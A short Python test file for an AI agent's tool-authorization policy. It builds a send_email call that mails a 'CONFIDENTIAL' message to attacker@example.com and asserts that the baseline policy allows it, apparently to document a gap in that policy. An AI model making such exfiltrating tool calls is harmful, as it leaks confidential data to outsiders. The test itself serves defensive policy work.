from tools.policy import authorize_tool_call


def test_baseline_policy_allows_attacker_recipient():
    call = {
        "tool": "send_email",
        "args": {
            "to": "attacker@example.com",
            "subject": "CONFIDENTIAL",
            "body": "x"
        }
    }

    decision = authorize_tool_call(call)

    assert decision["decision"] == "ALLOW", decision
